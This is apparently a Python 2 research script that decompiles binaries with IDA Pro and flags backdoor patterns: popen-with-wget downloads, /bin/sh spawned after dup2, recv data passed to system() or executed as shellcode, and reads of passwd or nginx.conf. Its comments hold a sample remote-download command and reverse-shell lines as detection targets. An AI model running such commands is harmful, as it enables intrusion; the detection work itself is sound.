
import re
import time
import os
import sys
work_dir='D:\\source\\test1\\'
#global var
g_node_num_name={}
g_node_name_num={}
g_func_name_address={}
g_graph_lines=[]
#get the c_lines list from ida command
def ida_disassam(file_name,addr):	
	#idaw -Ohexrays:-errs:-mail=john@mail.com:outfile:ALL -A input
	#ida64.exe -Ohexrays:-errs:-mail=john@mail.com:3658:main -A  "D:\source\test1\install_dir\p_17\test_xcb_image_shm"
	file_dir=os.path.dirname(file_name)	
	func_name_file=file_dir+'\\func_'+addr+'.c'
	if(os.path.isfile(func_name_file)==False):		
		cmd='ida64.exe -Ohexrays:-errs:-mail=john@mail.com:func_'+addr+':'+addr+' -A '+file_name
		#print cmd
		os.system(cmd)	
	myfile=open(func_name_file,'r')
	c_lines=[]
	for line in myfile.readlines():
		c_lines.append(line)
	return c_lines
#initial global node dict
def initial_node_name_dict():
	global g_node_name_num,g_node_num_name
	for line in g_graph_lines:
		#node: { title: "59" label: "strrchr" color: 80 textcolor: 73 bordercolor: black }
		reg_node=re.search('node: \{ title: "(?P<num>.*)" label: "(?P<name>.*)"',line)
		if reg_node:
			num=reg_node.group('num')
			name=reg_node.group('name')
			g_node_num_name[num]=name
			g_node_name_num[name]=num
#initial global func name address dict
def initial_func_name_addr_dict(file_name):
	global g_func_name_address
	func_file=file_name+'.funcs'
	myfile=open(func_file,'r')
	for line in myfile.readlines():
		func_addr=line.split(' ')[0][:-1] #strip L
		func_name=line.split(' ')[1][:-1] #strip '\n'
		#print func_name,func_addr
		g_func_name_address[func_name]=func_addr

#get the function call graph lines list from ida python script(idapython_get_call_graph.py)
def initial_ida_get_call_graph(file_name):	
	global g_graph_lines,work_dir
	#ida64.exe  -A -S"D:\source\idapython\test-ida.py" "D:\source\test1\old\p_16\symlinks"
	gdl_file=file_name+'.gdl'
	if(os.path.isfile(gdl_file)==False):		
		cmd='ida64.exe -S"'+work_dir+'idapython\\idapython\\idapython_get_call_graph.py" -A '+file_name
		print cmd
		os.system(cmd)	
	myfile=open(gdl_file,'r')
	for line in myfile.readlines():
		g_graph_lines.append(line)
	myfile.close()
	initial_node_name_dict()
	initial_func_name_addr_dict(file_name)



#get the caller func name from the callee_func_name(like .popen)
def get_caller_func(callee_func_name): 
	global g_graph_lines,g_node_name_num,g_node_num_name
	caller_func_name=set()
	callee_func_num=g_node_name_num[callee_func_name]
	#get caller func node num from the edge
	for line in g_graph_lines:
		#edge: { sourcename: "40" targetname: "23" }
		reg_edge=re.search('edge: \{ sourcename: "(?P<num>.*)" targetname: "'+callee_func_num+'"',line)
		if reg_edge:
			caller_func_num=reg_edge.group('num')
			caller_func_name.add(g_node_num_name[caller_func_num])
	return caller_func_name
	



def test_popen(mylog,file_name_path):
	global work_dir,g_func_name_address
	caller_func_name_set=get_caller_func('.popen')
	for caller_func_name in caller_func_name_set:
		test_func_flag=0
		mylog.write('start popen analysis func: '+caller_func_name)
		print 'start popen analysis func: '+caller_func_name,	
		addr=g_func_name_address[caller_func_name]	
		c_lines=ida_disassam(file_name_path,addr)		
		if(len(c_lines)==0):
			print 'decompile_func error'
		else:
			for line in c_lines:
				#popen("cd /bin;wget -O evilcat http://myip.com/evilcat", "r");
				regex=re.search('popen\(.*wget',line)
				if regex:
					mylog.write(',yes\n')
					print ',yes'
					test_func_flag=1
					break
		if(test_func_flag==0):
			mylog.write(',no\n')
			print ',no'
#execl(path, "/bin/sh", 0LL);
def test_execl(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.execl')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start execl analysis func: '+f)
			print 'start execl analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('dup2(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#execl(path, "/bin/sh", 0LL);
						regex=re.search('execl\(.*"/bin/sh".*\)',c_lines[i])
						
						if regex:
							print regex.group()
							mylog.write(',yes\n')
							print ',yes'
							flag_out=1
							break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'	
#execl(path, "/bin/sh", 0LL);
def test_system1(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.system')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start system1 analysis func: '+f)
			print 'start system1 analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('dup2(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#execl(path, "/bin/sh", 0LL);
						regex=re.search('system\(.*"/bin/sh".*\)',c_lines[i])
						if regex:
							mylog.write(',yes\n')
							print ',yes'
							flag_out=1
							break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'							
def test_system(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.system')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start system analysis func: '+f)
			print 'start system analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('recv(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#if ( recv(v19, _5924fc070d840801bdbed7cbbbc52f3e, 0x7D0uLL, 0) < 0 )
						regex=re.search('recv\((.*), (?P<src>(.*)), (.*), .*\)',c_lines[i])
						if regex:
							recv_value=regex.group('src')
							recv_lines.append((i,recv_value))
							taint_values.append(recv_value)
					#2. find taint value from =
					for (tmp_i,tmp_recv_value) in recv_lines:
						for i in range(tmp_i,lines_num):
							#*v28 = _5924fc070d840801bdbed7cbbbc52f3e[0];
							#v30 = _5924fc070d840801bdbed7cbbbc52f3e;
							regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
							if regex_recv:
								taint_value=regex_recv.group('src').strip(' ').strip('*')
								taint_values.append(taint_value)					
					#3. find system call 
					for taint_value1 in taint_values:
						if(flag_out==1):
							break
						#print taint_value1
						for (tmp_i,tmp_recv_value) in recv_lines:
							if(flag_out==1):
								break
							for i in range(tmp_i,lines_num):
								#system(_1b756b3aa8862d7730209615be62831e);
								regex_recv1=re.search('system\(.*'+taint_value1+'.*\)',c_lines[i])
								if regex_recv1:
									mylog.write(',yes\n')
									print ',yes'
									flag_out=1
									break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'					

def test_read(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.read')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start read analysis func: '+f)
			print 'start read analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			#if(all_lines.find('open(')!=-1 ):
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('open(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#v14 = open("/usr/local/etc/nginx/nginx.conf", 0);
						#v15 = read(v14, _1b756b3aa8862d7730209615be62831e, 0x400uLL);
						regex=re.search('(?P<dst>(.*)) = open\("(?P<src>(.*))", .*\)',c_lines[i])
						if regex:
							file_name_open=regex.group('src')
							file_handle=regex.group('dst').strip(' ').strip('*')
							print 'file name open: '+file_name_open
							regex_file_name=re.search('(nginx\.conf|passwd)',file_name_open)
							if(regex_file_name):
								recv_lines.append((i,file_handle))
								taint_values.append(file_handle)
					#2. find taint value from =
					for (tmp_i,tmp_recv_value) in recv_lines:
						for i in range(0,tmp_i):
							
							#v14 = open("/usr/local/etc/nginx/nginx.conf", 0);
							regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
							if regex_recv:
								taint_value=regex_recv.group('src').strip(' ').strip('*')
								taint_values.append(taint_value)					
					#3. find system call 
					for taint_value1 in taint_values:
						if(flag_out==1):
							break
						#print taint_value1
						for (tmp_i,tmp_recv_value) in recv_lines:
							if(flag_out==1):
								break
							for i in range(tmp_i,lines_num):
								#v15 = read(v14, _1b756b3aa8862d7730209615be62831e, 0x400uLL);
								regex_recv1=re.search('read\(.*'+taint_value1+', (.*), .*\)',c_lines[i])
								if regex_recv1:
									mylog.write(',yes\n')
									print ',yes'
									flag_out=1
									break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'	

def test_recv_shellcode(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.recv')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start recv_shellcode analysis func: '+f)
			print 'start recv_shellcode analysis func: '+f
			
			#c_lines=decompile_func(addr)
			c_lines=ida_disassam(file_name_path,addr)
			lines_num=len(c_lines)
			#all_lines='\n'.join(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				recv_lines=[]
				taint_values=[]
				#1. find recv value
				for i in range(lines_num):
					if(flag_out):
						break
					#if ( recv(v19, _5924fc070d840801bdbed7cbbbc52f3e, 0x7D0uLL, 0) < 0 )
					regex=re.search('recv\((.*), (?P<src>(.*)), (.*), .*\)',c_lines[i])
					if regex:
						recv_value=regex.group('src')
						index_1=recv_value.find('*')
						if(index_1!=-1):
							recv_value=recv_value[index_1+1:]
						print str(i),recv_value
						recv_lines.append((i,recv_value))
						taint_values.append(recv_value)
						#print recv_value
				#2. find taint value from =
				for (tmp_i,tmp_recv_value) in recv_lines:
					for i in range(tmp_i,lines_num):
						#*v28 = _5924fc070d840801bdbed7cbbbc52f3e[0];
						#v30 = _5924fc070d840801bdbed7cbbbc52f3e;
						regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
						if regex_recv:
							taint_value=regex_recv.group('src').strip(' ').strip('*')
							taint_values.append(taint_value)
				
				#3. find call shellcode
				for taint_value1 in taint_values:
					if(flag_out==1):
						break
					#print taint_value1
					for (tmp_i,tmp_recv_value) in recv_lines:
						if(flag_out==1):
							break
						for i in range(tmp_i,lines_num):
							#((void (__fastcall *)(_DWORD *, char *, signed __int64, signed __int64))v28)(v34, v35, v31, v33);
							regex_recv1=re.search('call \*\).*'+taint_value1+'.*;',c_lines[i])
							if regex_recv1:
								mylog.write(',yes\n')
								print ',yes'
								flag_out=1
								break
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'
def main(file_name_path):
	global work_dir
	initial_ida_get_call_graph(file_name_path)
	base_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	output_dir=work_dir+'output\\'+p_dir+'\\'
	try:
		os.makedirs(output_dir,0777)
	except:
		print 'dir already exists'
		
	print 'start analysis'		
	mylog=open(output_dir+base_name+'.output','w')
	print 'start popen analysis'	
	test_popen(mylog,file_name_path)
	'''
	print 'start system analysis'
	test_system(mylog,file_name_path)
	test_system1(mylog,file_name_path)
	print 'start recv_shellcode analysis'	
	test_recv_shellcode(mylog,file_name_path)
	print 'start read analysis'
	test_read(mylog,file_name_path)
	print 'start execl analysis'
	test_execl(mylog,file_name_path)
	mylog.close()
	print 'ok'
	
	'''


    
if(len(sys.argv)!=2):
	print "python test_detect.py file_name"
file_name_arg=sys.argv[1]
print file_name_arg


main(file_name_arg)